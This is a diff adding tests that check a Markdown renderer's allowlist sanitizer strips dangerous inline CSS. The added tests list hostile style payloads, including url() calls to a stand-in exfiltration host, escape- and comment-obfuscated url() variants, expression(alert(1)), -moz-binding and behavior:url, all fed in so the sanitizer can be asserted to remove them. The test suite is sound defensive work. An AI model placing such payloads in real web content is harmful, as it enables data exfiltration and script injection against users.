@@ -22,7 +22,7 @@
 
 import assert = require('assert');
 import * as cheerio from 'cheerio';
-import { convertMarkdownToHtml } from '../src/render';
+import { convertMarkdownToHtml, applyAllowlistSanitizer } from '../src/render';
 
 describe('Allowlist sanitizer — content fidelity (#552)', () => {
     it('preserves GFM table structure and per-column text-align styles', () => {
@@ -127,5 +127,49 @@ describe('Allowlist sanitizer — inversion / normalization (#552)', () => {
         assert.strictEqual($('article').length, 0, 'unknown wrapper dropped');
         assert.strictEqual($('p').length, 1, 'allowlisted child lifted and preserved');
         assert.strictEqual($('p').text(), 'kept paragraph', 'child content preserved');
+    });
+});
+
+// The allowlist layer ALONE must neutralize style-attribute CSS smuggling —
+// independence from the guard pre-filter is the architectural point of #552.
+// applyAllowlistSanitizer is exported for exactly this test; production always
+// runs the guards first via sanitizeRenderedHtml.
+describe('allowedStyles: the sanitizer layer alone strips dangerous inline CSS (#552)', () => {
+    const BS = '\\';
+    const hostile = [
+        'background:url(https://evil.example.com/exfil?x=1)',
+        `background:${BS}75rl(https://evil.example.com/x)`,
+        `background:${BS}75 rl(https://evil.example.com/x)`,
+        `background:${BS}u${BS}r${BS}l(https://evil.example.com/x)`,
+        `background:${BS}2f${BS}2a url(https://evil.example.com/x) ${BS}2a${BS}2f`,
+        'background:url/* x */(https://evil.example.com/x)',
+        'width:expression(alert(1))',
+        `-moz-binding:url(${'https://evil.example.com/xbl'})`,
+        'behavior:url(#default#time2)',
+        `color:red;background:url(https://evil.example.com/x)`,
+    ];
+
+    for (const payload of hostile) {
+        it(`strips: style="${payload.slice(0, 60)}"`, () => {
+            const out = applyAllowlistSanitizer(`<p style="${payload}">x</p>`);
+            assert.ok(!/evil\.example\.com/i.test(out), `exfil host must not survive (got: ${out})`);
+            assert.ok(!/url|expression|binding|behavior/i.test(out), `dangerous construct must not survive (got: ${out})`);
+        });
+    }
+
+    it('keeps GFM table alignment (text-align) through the style parser', () => {
+        const out = applyAllowlistSanitizer('<td style="text-align:right">x</td>');
+        assert.ok(/text-align\s*:\s*right/i.test(out), `text-align survives (got: ${out})`);
+    });
+
+    it('keeps benign color values (named and hex) and drops the rest of a mixed declaration', () => {
+        const out = applyAllowlistSanitizer('<span style="color:#333;background:url(https://evil.example.com/x)">x</span>');
+        assert.ok(/color\s*:\s*#333/i.test(out), `hex color survives (got: ${out})`);
+        assert.ok(!/evil\.example\.com/i.test(out), `smuggled url dropped from mixed declaration (got: ${out})`);
+    });
+
+    it('drops a non-allowlisted value shape for an allowlisted property', () => {
+        const out = applyAllowlistSanitizer('<p style="color:url(https://evil.example.com/x)">x</p>');
+        assert.ok(!/evil\.example\.com/i.test(out), `color:url() cannot match the anchored value patterns (got: ${out})`);
     });
 });
